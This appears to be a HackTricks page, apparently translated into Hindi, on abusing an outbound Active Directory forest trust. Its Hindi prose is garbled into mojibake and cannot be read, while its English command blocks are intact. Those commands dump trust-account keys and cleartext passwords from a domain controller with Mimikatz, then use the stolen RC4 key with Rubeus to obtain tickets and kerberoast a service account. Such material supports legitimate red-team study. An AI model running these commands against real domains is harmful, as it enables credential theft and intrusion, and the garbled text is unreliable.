# рдмрд╛рд╣рд░реА рдлрд╝реЙрд░реЗрд╕реНрдЯ рдбреЛрдореЗрди - рдПрдХрддрд░рдлрд╛ (рдЖрдЙрдЯрдмрд╛рдЙрдВрдб)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ **рдЖрдкрдХрд╛ рдбреЛрдореЗрди** рдХреБрдЫ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ** рдХреЛ **рдЕрд▓рдЧ рдбреЛрдореЗрдиреНрд╕** рд╕реЗ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдкрд░ **рднрд░реЛрд╕рд╛** рдХрд░ рд░рд╣рд╛ рд╣реИред

## рд╕реВрдЪреАрдХрд░рдг

### рдЖрдЙрдЯрдмрд╛рдЙрдВрдб рдЯреНрд░рд╕реНрдЯ
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## рдЯреНрд░рд╕реНрдЯ рдЕрдХрд╛рдЙрдВрдЯ рдЕрдЯреИрдХ

рдЬрдм рдПрдХ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдбреЛрдореЗрди рдпрд╛ рдлреЙрд░реЗрд╕реНрдЯ рдЯреНрд░рд╕реНрдЯ рдбреЛрдореЗрди _B_ рд╕реЗ рдбреЛрдореЗрди _A_ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯрдЕрдк рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (_**B**_ A рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИ), рдбреЛрдореЗрди **A** рдореЗрдВ рдПрдХ рдЯреНрд░рд╕реНрдЯ рдЕрдХрд╛рдЙрдВрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдирд╛рдо **B. Kerberos trust keys** рд╣реЛрддрд╛ рд╣реИ,\_рдЬреЛ рдХрд┐ **рдЯреНрд░рд╕реНрдЯ рдЕрдХрд╛рдЙрдВрдЯ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб** рд╕реЗ рдирд┐рдХрд╛рд▓реЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдФрд░ рдЗрдирдХрд╛ рдЙрдкрдпреЛрдЧ **рдЗрдВрдЯрд░-рд░рд┐рдпрд▓реНрдо TGTs рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ** рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ, рдЬрдм рдбреЛрдореЗрди A рдХреЗ рдпреВрдЬрд░реНрд╕ рдбреЛрдореЗрди B рдореЗрдВ рд╕рд░реНрд╡рд┐рд╕реЗрдЬ рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд┐рд╕ рдЯрд┐рдХрдЯреНрд╕ рдХреА рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВред

рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЕрдХрд╛рдЙрдВрдЯ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
рдЬреЛрдЦрд┐рдо рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЯреНрд░рд╕реНрдЯ рдЕрдХрд╛рдЙрдВрдЯ B$ рд╕рдХреНрд╖рдо рд╣реИ, **B$ рдХрд╛ рдкреНрд░рд╛рдЗрдорд░реА рдЧреНрд░реБрдк рдбреЛрдореЗрди A рдХреЗ рдбреЛрдореЗрди рдпреВрдЬрд░реНрд╕ рд╣реИ**, рдбреЛрдореЗрди рдпреВрдЬрд░реНрд╕ рдХреЛ рджреА рдЧрдИ рдХреЛрдИ рднреА рдЕрдиреБрдорддрд┐ B$ рдкрд░ рд▓рд╛рдЧреВ рд╣реЛрддреА рд╣реИ, рдФрд░ B$ рдХреА рд╕рд╛рдЦ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЛрдореЗрди A рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

{% hint style="warning" %}
рдЗрд╕рд▓рд┐рдП, рдЯреНрд░рд╕реНрдЯрд┐рдВрдЧ рдбреЛрдореЗрди рд╕реЗ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдЯреНрд░рд╕реНрдЯреЗрдб рдбреЛрдореЗрди рдХреЗ рдЕрдВрджрд░ рдПрдХ рдпреВрдЬрд░ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред рдЗрд╕ рдпреВрдЬрд░ рдХреЗ рдкрд╛рд╕ рдмрд╣реБрдд рдЕрдзрд┐рдХ рдЕрдиреБрдорддрд┐рдпрд╛рдВ рдирд╣реАрдВ рд╣реЛрдВрдЧреА (рд╢рд╛рдпрдж рдХреЗрд╡рд▓ рдбреЛрдореЗрди рдпреВрдЬрд░реНрд╕) рд▓реЗрдХрд┐рди рдЖрдк **рдмрд╛рд╣рд░реА рдбреЛрдореЗрди рдХрд╛ рдЕрдиреБрдХреНрд░рдордг рдХрд░ рдкрд╛рдПрдВрдЧреЗ**ред
{% endhint %}

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЯреНрд░рд╕реНрдЯрд┐рдВрдЧ рдбреЛрдореЗрди `ext.local` рд╣реИ рдФрд░ рдЯреНрд░рд╕реНрдЯреЗрдб рд╡рд╛рд▓рд╛ `root.local` рд╣реИред рдЗрд╕рд▓рд┐рдП, `root.local` рдХреЗ рдЕрдВрджрд░ `EXT$` рдирд╛рдордХ рдПрдХ рдпреВрдЬрд░ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред
```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```
рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рд╕рдордп **`root.local\EXT$`** рдХрд╛ рд╡рд░реНрддрдорд╛рди **рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рдХреЗрд░реНрдмреЗрд░реЛрд╕ рдЧреБрдкреНрдд рдХреБрдВрдЬреА** рд╣реИред **`root.local\EXT$`** рдХреЗрд░реНрдмреЗрд░реЛрд╕ AES рдЧреБрдкреНрдд рдХреБрдВрдЬрд┐рдпрд╛рдБ AES рдЯреНрд░рд╕реНрдЯ рдХреБрдВрдЬрд┐рдпреЛрдВ рд╕реЗ рднрд┐рдиреНрди рд╣реЛрддреА рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдПрдХ рдЕрд▓рдЧ рдирдордХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкрд░рдВрддреБ **RC4 рдХреБрдВрдЬрд┐рдпрд╛рдБ рд╕рдорд╛рди рд╣реЛрддреА рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП, рд╣рдо **RC4 рдЯреНрд░рд╕реНрдЯ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ ext.local рд╕реЗ рдирд┐рдХрд╛рд▓реА рдЧрдИ рд╣реИ `root.local\EXT$` рдХреЗ рд░реВрдк рдореЗрдВ `root.local` рдХреЗ рдЦрд┐рд▓рд╛рдл **рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдПред
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
рдЗрд╕рдХреЗ рд╕рд╛рде рдЖрдк рдЙрд╕ рдбреЛрдореЗрди рдХрд╛ рдЕрдиреБрдХреНрд░рдордг рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдХреЗрд░реНрдмреЗрд░реЛрд╕реНрдЯрд┐рдВрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рднреА:
```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рд╡рд┐рд╢реНрд╡рд╛рд╕ рдкрд╛рд╕рд╡рд░реНрдб рдПрдХрддреНрд░рд┐рдд рдХрд░рдирд╛

рдкрд┐рдЫрд▓реЗ рдкреНрд░рд╡рд╛рд╣ рдореЗрдВ **рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдкрд╛рд╕рд╡рд░реНрдб** рдХреЗ рдмрдЬрд╛рдп рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ (рдЬрд┐рд╕реЗ mimikatz рджреНрд╡рд╛рд░рд╛ рднреА **рдбрдВрдк рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛**).

рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ mimikatz рд╕реЗ \[ CLEAR ] рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рд╕реЗ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдХреЗ рдФрд░ рдирд▓ рдмрд╛рдЗрдЯреНрд╕ тАШ\x00тАЩ рдХреЛ рд╣рдЯрд╛рдХрд░ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

рдХрднреА-рдХрднреА рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╕рдВрдмрдВрдз рдмрдирд╛рддреЗ рд╕рдордп, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб рдЯрд╛рдЗрдк рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕ рдкреНрд░рджрд░реНрд╢рди рдореЗрдВ, рдХреБрдВрдЬреА рдореВрд▓ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИ рдФрд░ рдЗрд╕рд▓рд┐рдП рдорд╛рдирд╡ рдкрдардиреАрдп рд╣реИред рдЬреИрд╕реЗ рдХреБрдВрдЬреА рдЪрдХреНрд░ (30 рджрд┐рди) рд╣реЛрддреЗ рд╣реИрдВ, рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдорд╛рдирд╡ рдкрдардиреАрдп рдирд╣реАрдВ рд╣реЛрдЧрд╛ рд▓реЗрдХрд┐рди рддрдХрдиреАрдХреА рд░реВрдк рд╕реЗ рдЕрднреА рднреА рдЙрдкрдпреЛрдЧреА рд╣реЛрдЧрд╛ред

рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдЦрд╛рддреЗ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рдпрдорд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╡рд┐рд╢реНрд╡рд╛рд╕ рдЦрд╛рддреЗ рдХреА Kerberos рдЧреБрдкреНрдд рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ TGT рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╡рд┐рдХрд▓реНрдкред рдпрд╣рд╛рдБ, root.local рд╕реЗ ext.local рдХреЗ рд▓рд┐рдП Domain Admins рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рдХреА рдкреВрдЫрддрд╛рдЫ рдХрд░рдирд╛:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## рд╕рдВрджрд░реНрдн

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
